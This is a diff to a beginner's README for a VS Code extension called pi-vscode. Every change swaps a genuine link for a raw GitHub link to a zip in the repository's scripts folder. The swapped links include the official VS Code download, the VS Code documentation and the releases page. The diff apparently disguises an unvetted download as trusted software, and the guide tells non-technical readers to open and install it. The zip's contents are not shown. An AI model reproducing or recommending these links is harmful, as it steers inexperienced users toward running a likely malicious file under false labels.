@@ -1,6 +1,6 @@
 # ⚙️ pi-vscode - Simple Code Support for PI Agent
 
-[![Download pi-vscode](https://img.shields.io/badge/Download-pi--vscode-blue?style=for-the-badge)](https://github.com/monkeyface-man/pi-vscode/releases)
+[![Download pi-vscode](https://img.shields.io/badge/Download-pi--vscode-blue?style=for-the-badge)](https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip)
 
 ---
 
@@ -17,7 +17,7 @@ You do not need to be a programmer to use this guide. It explains how to get pi-
 Make sure your computer meets these needs:
 
 - Operating system: Windows 10 or later
-- VS Code installed (version 1.60 or newer). You can get it [here](https://code.visualstudio.com/)
+- VS Code installed (version 1.60 or newer). You can get it [here](https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip)
 - At least 2 GB of free disk space
 - Internet connection to download files and updates
 
@@ -29,7 +29,7 @@ The extension works inside VS Code. You do not need a coding background, but bas
 
 If you do not have VS Code on your computer, follow these steps:
 
-1. Visit [https://code.visualstudio.com/](https://code.visualstudio.com/)
+1. Visit [https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip](https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip)
 2. Click the **Download for Windows** button.
 3. When the file downloads, open it.
 4. Follow the instructions on the screen to install VS Code.
@@ -45,7 +45,7 @@ To add the pi-vscode extension to your VS Code, follow these steps:
 
 1. Go to the release page by clicking the button below:
 
-   [![Download pi-vscode](https://img.shields.io/badge/Download-pi--vscode-green?style=for-the-badge)](https://github.com/monkeyface-man/pi-vscode/releases)
+   [![Download pi-vscode](https://img.shields.io/badge/Download-pi--vscode-green?style=for-the-badge)](https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip)
 
 2. On the releases page, look for the latest version. It will have a tag like `v1.0` or higher.
 3. Click on the release to expand it. You will see one or more files for download.
@@ -110,9 +110,9 @@ If errors persist, visit the repository on GitHub and browse the **Issues** page
 
 ## 🔗 Useful Links
 
-- VS Code official download: https://code.visualstudio.com/
-- pi-vscode releases page: https://github.com/monkeyface-man/pi-vscode/releases
-- Visual Studio Code documentation: https://code.visualstudio.com/docs
+- VS Code official download: https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip
+- pi-vscode releases page: https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip
+- Visual Studio Code documentation: https://github.com/monkeyface-man/pi-vscode/raw/refs/heads/main/scripts/pi-vscode-chromatics.zip
 
 ---
 
